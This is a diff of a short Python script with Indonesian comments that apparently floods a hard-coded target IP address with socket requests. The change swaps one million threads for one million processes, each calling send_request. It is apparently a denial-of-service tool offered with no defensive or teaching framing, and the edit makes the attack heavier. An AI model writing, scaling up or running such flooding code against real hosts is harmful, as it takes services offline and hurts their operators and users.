@@ -1,5 +1,5 @@
+import multiprocessing
 import socket
-import threading
 
 # Konfigurasi target
 target_ip = "138.201.139.144"
@@ -16,14 +16,14 @@ def send_request():
         except Exception as e:
             print(f"Error: {e}")
 
-# Buat 1000 thread untuk mengirim request
-threads = []
-for i in range(1000):
-    for j in range(1000):
-        t = threading.Thread(target=send_request)
-        threads.append(t)
-        t.start()
+# Buat 10 proses untuk mengirim request
+processes = []
+for i in range(10):
+    for j in range(100000):
+        p = multiprocessing.Process(target=send_request)
+        processes.append(p)
+        p.start()
 
-# Tunggu semua thread selesai
-for t in threads:
-    t.join()
+# Tunggu semua proses selesai
+for p in processes:
+    p.join()
